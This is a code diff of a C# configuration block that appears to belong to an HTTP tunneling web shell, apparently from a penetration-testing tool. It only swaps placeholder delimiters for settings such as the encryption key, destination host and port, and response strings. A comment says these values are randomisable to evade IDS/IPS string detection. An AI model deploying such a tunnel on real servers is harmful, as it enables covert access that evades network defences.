@@ -154,59 +154,59 @@ public class SessionConnection
 
 /* Begin configurable options */
 
-protected bool useIPV6ClientSocketOnServer = bool.Parse("%PLACEHOLDER_useIPV6ClientSocketOnServer%");
+protected bool useIPV6ClientSocketOnServer = bool.Parse("|PLACEHOLDER_useIPV6ClientSocketOnServer|");
 
-protected const int serverSocketMaxUnusedIterations = %PLACEHOLDER_serverSocketMaxUnusedIterations%;
+protected const int serverSocketMaxUnusedIterations = |PLACEHOLDER_serverSocketMaxUnusedIterations|;
 
-protected const int serverSocketIOTimeout = %PLACEHOLDER_serverSocketIOTimeout%;
-protected const int serverSocketSendBufferSize = %PLACEHOLDER_serverSocketSendBufferSize%;
-protected const int serverSocketReceiveBufferSize = %PLACEHOLDER_serverSocketReceiveBufferSize%;
+protected const int serverSocketIOTimeout = |PLACEHOLDER_serverSocketIOTimeout|;
+protected const int serverSocketSendBufferSize = |PLACEHOLDER_serverSocketSendBufferSize|;
+protected const int serverSocketReceiveBufferSize = |PLACEHOLDER_serverSocketReceiveBufferSize|;
 
-protected const int serverToClientBlockSize = %PLACEHOLDER_serverToClientBlockSize%;
+protected const int serverToClientBlockSize = |PLACEHOLDER_serverToClientBlockSize|;
 
 /* Most of the options in this section are configurable to avoid simplistic string-based IDS/IPS-type detection */
 /* If they are altered, be sure to pass the corresponding alternate values to the Python client software */
 
-protected const string headerValueKey = "%PLACEHOLDER_headerValueKey%";
-protected const string encryptionKeyHex = "%PLACEHOLDER_encryptionKeyHex%";
+protected const string headerValueKey = "|PLACEHOLDER_headerValueKey|";
+protected const string encryptionKeyHex = "|PLACEHOLDER_encryptionKeyHex|";
 
-protected const string headerNameKey = "%PLACEHOLDER_headerNameKey%";
+protected const string headerNameKey = "|PLACEHOLDER_headerNameKey|";
 
-protected const string accessKeyMode = "%PLACEHOLDER_accessKeyMode%";
-protected const string paramNameAccessKey = "%PLACEHOLDER_paramNameAccessKey%";
+protected const string accessKeyMode = "|PLACEHOLDER_accessKeyMode|";
+protected const string paramNameAccessKey = "|PLACEHOLDER_paramNameAccessKey|";
 
-protected const string paramNameOperation = "%PLACEHOLDER_paramNameOperation%";
-protected const string paramNameDestinationHost = "%PLACEHOLDER_paramNameDestinationHost%";
-protected const string paramNameDestinationPort = "%PLACEHOLDER_paramNameDestinationPort%";
-protected const string paramNameConnectionID = "%PLACEHOLDER_paramNameConnectionID%";
-protected const string paramNameData = "%PLACEHOLDER_paramNameData%";
-protected const string paramNamePlaintextBlock = "%PLACEHOLDER_paramNamePlaintextBlock%";
-protected const string paramNameEncryptedBlock = "%PLACEHOLDER_paramNameEncryptedBlock%";
+protected const string paramNameOperation = "|PLACEHOLDER_paramNameOperation|";
+protected const string paramNameDestinationHost = "|PLACEHOLDER_paramNameDestinationHost|";
+protected const string paramNameDestinationPort = "|PLACEHOLDER_paramNameDestinationPort|";
+protected const string paramNameConnectionID = "|PLACEHOLDER_paramNameConnectionID|";
+protected const string paramNameData = "|PLACEHOLDER_paramNameData|";
+protected const string paramNamePlaintextBlock = "|PLACEHOLDER_paramNamePlaintextBlock|";
+protected const string paramNameEncryptedBlock = "|PLACEHOLDER_paramNameEncryptedBlock|";
 
-protected const string dataBlockNameValueSeparatorB64 = "%PLACEHOLDER_dataBlockNameValueSeparatorB64%";
-protected const string dataBlockParamSeparatorB64 = "%PLACEHOLDER_dataBlockParamSeparatorB64%";
+protected const string dataBlockNameValueSeparatorB64 = "|PLACEHOLDER_dataBlockNameValueSeparatorB64|";
+protected const string dataBlockParamSeparatorB64 = "|PLACEHOLDER_dataBlockParamSeparatorB64|";
 
-protected const string opModeStringOpenConnection = "%PLACEHOLDER_opModeStringOpenConnection%";
-protected const string opModeStringSendReceive = "%PLACEHOLDER_opModeStringSendReceive%";
-protected const string opModeStringCloseConnection = "%PLACEHOLDER_opModeStringCloseConnection%";
+protected const string opModeStringOpenConnection = "|PLACEHOLDER_opModeStringOpenConnection|";
+protected const string opModeStringSendReceive = "|PLACEHOLDER_opModeStringSendReceive|";
+protected const string opModeStringCloseConnection = "|PLACEHOLDER_opModeStringCloseConnection|";
 
-protected const string responseStringHide = "%PLACEHOLDER_responseStringHide%";
-protected const string responseStringConnectionCreated = "%PLACEHOLDER_responseStringConnectionCreated%";
-protected const string responseStringConnectionClosed = "%PLACEHOLDER_responseStringConnectionClosed%";
-protected const string responseStringData = "%PLACEHOLDER_responseStringData%";
-protected const string responseStringNoData = "%PLACEHOLDER_responseStringNoData%";
-protected const string responseStringErrorGeneric = "%PLACEHOLDER_responseStringErrorGeneric%";
-protected const string responseStringErrorInvalidRequest = "%PLACEHOLDER_responseStringErrorInvalidRequest%";
-protected const string responseStringErrorConnectionNotFound = "%PLACEHOLDER_responseStringErrorConnectionNotFound%";
-protected const string responseStringErrorConnectionOpenFailed = "%PLACEHOLDER_responseStringErrorConnectionOpenFailed%";
-protected const string responseStringErrorConnectionCloseFailed = "%PLACEHOLDER_responseStringErrorConnectionCloseFailed%";
-protected const string responseStringErrorConnectionSendFailed = "%PLACEHOLDER_responseStringErrorConnectionSendFailed%";
-protected const string responseStringErrorConnectionReceiveFailed = "%PLACEHOLDER_responseStringErrorConnectionReceiveFailed%";
-protected const string responseStringErrorDecryptFailed = "%PLACEHOLDER_responseStringErrorDecryptFailed%";
-protected const string responseStringErrorEncryptFailed = "%PLACEHOLDER_responseStringErrorEncryptFailed%";
-protected const string responseStringErrorEncryptionNotSupported = "%PLACEHOLDER_responseStringErrorEncryptionNotSupported%";
-protected const string responseStringPrefixB64 = "%PLACEHOLDER_responseStringPrefixB64%";
-protected const string responseStringSuffixB64 = "%PLACEHOLDER_responseStringSuffixB64%";
+protected const string responseStringHide = "|PLACEHOLDER_responseStringHide|";
+protected const string responseStringConnectionCreated = "|PLACEHOLDER_responseStringConnectionCreated|";
+protected const string responseStringConnectionClosed = "|PLACEHOLDER_responseStringConnectionClosed|";
+protected const string responseStringData = "|PLACEHOLDER_responseStringData|";
+protected const string responseStringNoData = "|PLACEHOLDER_responseStringNoData|";
+protected const string responseStringErrorGeneric = "|PLACEHOLDER_responseStringErrorGeneric|";
+protected const string responseStringErrorInvalidRequest = "|PLACEHOLDER_responseStringErrorInvalidRequest|";
+protected const string responseStringErrorConnectionNotFound = "|PLACEHOLDER_responseStringErrorConnectionNotFound|";
+protected const string responseStringErrorConnectionOpenFailed = "|PLACEHOLDER_responseStringErrorConnectionOpenFailed|";
+protected const string responseStringErrorConnectionCloseFailed = "|PLACEHOLDER_responseStringErrorConnectionCloseFailed|";
+protected const string responseStringErrorConnectionSendFailed = "|PLACEHOLDER_responseStringErrorConnectionSendFailed|";
+protected const string responseStringErrorConnectionReceiveFailed = "|PLACEHOLDER_responseStringErrorConnectionReceiveFailed|";
+protected const string responseStringErrorDecryptFailed = "|PLACEHOLDER_responseStringErrorDecryptFailed|";
+protected const string responseStringErrorEncryptFailed = "|PLACEHOLDER_responseStringErrorEncryptFailed|";
+protected const string responseStringErrorEncryptionNotSupported = "|PLACEHOLDER_responseStringErrorEncryptionNotSupported|";
+protected const string responseStringPrefixB64 = "|PLACEHOLDER_responseStringPrefixB64|";
+protected const string responseStringSuffixB64 = "|PLACEHOLDER_responseStringSuffixB64|";
 
 
 /* End configurable options */
